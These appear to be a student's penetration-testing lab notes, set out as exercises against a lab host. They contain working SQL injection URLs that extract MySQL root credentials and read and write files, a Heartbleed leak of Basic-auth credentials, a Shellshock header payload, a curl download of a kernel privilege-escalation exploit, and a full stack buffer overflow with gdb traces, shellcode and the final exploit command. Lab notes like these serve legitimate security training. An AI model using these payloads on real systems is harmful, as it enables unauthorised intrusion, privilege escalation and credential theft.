==== EXERCICE 1 ====
* Possible exploitations:
  * mysql's root password:
    * http://10.0.0.5/bacula-web/joblogs.php?jobid=-1' UNION SELECT NULL,NULL,User,password FROM mysql.user WHERE User='root
  * Write file :
    * INTO OUTFILE
http://10.0.0.5/bacula-web/joblogs.php?jobid=0' union select "hello",2,3,4 INTO OUTFILE '/tmp/myfile'%23

  * Read file
    *    LOAD_FILE('/etc/passwd') 
    * http://10.0.0.5/bacula-web/joblogs.php?jobid=0%27%20union%20select%201,2,LOAD_FILE(%27/etc/passwd%27),2%23


==== EXERCICE 2 ====
* python ./hb-test.py 10.0.0.5
* info disclosure (basic creds)
---
  3e40: 65 55 4A 70 61 57 6C 6E 55 47 46 7A 63 33 63 77  eUJpaWlnUGFzc3cw
  3e50: 63 6D 51 3D 55 73 65 72 2D 41 67 65 6E 74 3A 20  cmQ=User-Agent: 
  3e60: 63 75 72 6C 2F 37 2E 33 37 2E 31 48 6F 73 74 3A  curl/7.37.1Host:
  3e70: 20 31 30 2E 30 2E 30 2E 35 41 63 63 65 70 74 3A   10.0.0.5Accept:
  3e80: 20 2A 2F 2A 47 45 54 20 2F 70 72 6F 74 65 63 74   */*GET /protect
  3e90: 65 64 2F 77 69 6E 20 48 54 54 50 2F 31 2E 31 41  ed/win HTTP/1.1A
  3ea0: 75 74 68 6F 72 69 7A 61 74 69 6F 6E 3A 20 42 61  uthorization: Ba
  3eb0: 73 69 63 20 61 6D 39 6F 62 6A 70 4E 65 55 4A 70  sic am9objpNeUJp
  3ec0: 61 57 6C 6E 55 47 46 7A 63 33 63 77 63 6D 51 3D  aWlnUGFzc3cwcmQ=
  3ed0: 55 73 65 72 2D 41 67 65 6E 74 3A 20 63 75 72 6C  User-Agent: curl
---
* B64 decode:
---
$ echo "am9objpNeUJpaWlnUGFzc3cwcmQ=" | base64 -d
john:MyBiiigPassw0rd
---


==== EXERCICE 3 ====
* Test the vulnerability
---
$ nc 10.0.0.5 80
GET /cgi-bin/index.php HTTP/1.0
host: 10.0.0.5
User-Agent: () { :; }; echo; echo; echo Vuln; /bin/uname -a;
X-FWD: blabla
---



==== EXERCICE 4 ====

KERNEL:
curl -k https://www.exploit-db.com/download/37292 > bbb.c
CVE-2015-1328


LOCAL BIN:


run ` perl -e 'print "\x90"x256; print "aaaabbbbccccddddeeeeffffgggghhhhiiii"'`

Your input: ����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������aaaabbbbccccddddeeeeffffgggghhhhiiii

Program received signal SIGSEGV, Segmentation fault.
--------------------------------------------------------------------------[regs]
  EAX: 0x00000000  EBX: 0xB7FD1FF4  ECX: 0x00000000  EDX: 0x00000000  o d I t S z a P c 
  ESI: 0x00000000  EDI: 0x00000000  EBP: 0x63636363  ESP: 0xBFFFF4E0  EIP: 0x64646464
  CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007BError while running hook_stop:
Cannot access memory at address 0x64646464


EIP@0x64646464 --> dddd


   0x0804844b <+55>:	mov    DWORD PTR [esp+0x4],eax
   0x0804844f <+59>:	lea    eax,[esp+0x10]
   0x08048453 <+63>:	mov    DWORD PTR [esp],eax
   0x08048456 <+66>:	call   0x8048330 <strcpy@plt>
   0x0804845b <+71>:	mov    eax,0x8048561
   0x08048460 <+76>:	lea    edx,[esp+0x10]
   0x08048464 <+80>:	mov    DWORD PTR [esp+0x4],edx
   0x08048468 <+84>:	mov    DWORD PTR [esp],eax
   0x0804846b <+87>:	call   0x8048320 <printf@plt>
   0x08048470 <+92>:	mov    eax,0x0
   0x08048475 <+97>:	leave  
   0x08048476 <+98>:	ret    
End of assembler dump.

gdb$ b *0x08048456
Breakpoint 2 at 0x8048456
gdb$ r
--------------------------------------------------------------------------[regs]
  EAX: 0xBFFFEDE0  EBX: 0xB7FD1FF4  ECX: 0xBFFFF284  EDX: 0xBFFFF214  o d I t S z a P c 
  ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF1E8  ESP: 0xBFFFEDD0  EIP: 0x08048456
  CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
--------------------------------------------------------------------------[code]
=> 0x8048456 <main+66>:	call   0x8048330 <strcpy@plt>
   0x804845b <main+71>:	mov    eax,0x8048561
   0x8048460 <main+76>:	lea    edx,[esp+0x10]
   0x8048464 <main+80>:	mov    DWORD PTR [esp+0x4],edx
   0x8048468 <main+84>:	mov    DWORD PTR [esp],eax
   0x804846b <main+87>:	call   0x8048320 <printf@plt>
   0x8048470 <main+92>:	mov    eax,0x0
   0x8048475 <main+97>:	leave  
--------------------------------------------------------------------------------

Breakpoint 2, 0x08048456 in main ()
gdb$ x/2wx $esp
0xbfffedd0:	0xbfffede0	0xbffff413
gdb$ x/wx 0xbfffede0
0xbfffede0:	0xb7e3eb97
gdb$ x/wx 0xbffff413
0xbffff413:	0x90909090
gdb$ c


exploit:
http://shell-storm.org/shellcode/
Linux

char shellcode[] = "\xeb\x11\x5e\x31\xc9\xb1\x21\x80"
     		    "\x6c\x0e\xff\x01\x80\xe9\x01\x75"
			   "\xf6\xeb\x05\xe8\xea\xff\xff\xff"
				   "\x6b\x0c\x59\x9a\x53\x67\x69\x2e"
					   "\x71\x8a\xe2\x53\x6b\x69\x69\x30"
						   "\x63\x62\x74\x69\x30\x63\x6a\x6f"
							   "\x8a\xe4\x53\x52\x54\x8a\xe2\xce"
"\x81";

"\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81";

perl -e 'print "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"' | wc
     0       2      57

gdb$ x/300wx 0xbfffede0
0xbfffede0:  0x90909090	0x90909090	0x90909090	0x90909090
0xbfffedf0:  0x90909090	0x90909090	0x90909090	0x90909090
0xbfffee00:  0x90909090	0x90909090	0x90909090	0x90909090
0xbfffee10:  0x90909090	0x90909090	0x90909090	0x90909090
0xbfffee20:  0x90909090	0x90909090	0x90909090	0x90909090
0xbfffee30:  0x90909090	0x90909090	0x90909090	0x90909090
0xbfffee40:  0x90909090	0x90909090	0x90909090	0x90909090
0xbfffee50:  0x90909090	0x90909090	0x90909090	0x90909090
0xbfffee60:  0x90909090	0x90909090	0x90909090	0x90909090
0xbfffee70:  0x90909090	0x90909090	0x90909090	0x90909090
0xbfffee80:  0x90909090	0x90909090	0x90909090	0x90909090
0xbfffee90:  0x90909090	0x90909090	0x90909090	0x90909090
0xbfffeea0:  0x90909090	0x90909090	0x90909090	0x90909090



./local_bin_exploit ` perl -e 'print "\x90"x(1024-57-500); print "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"; print "\x90"x500;print "aaaabbbbcccc"; print "\xe0\xee\xff\xbf"'`



CRONTAB




==== EXERCICE 6 ====
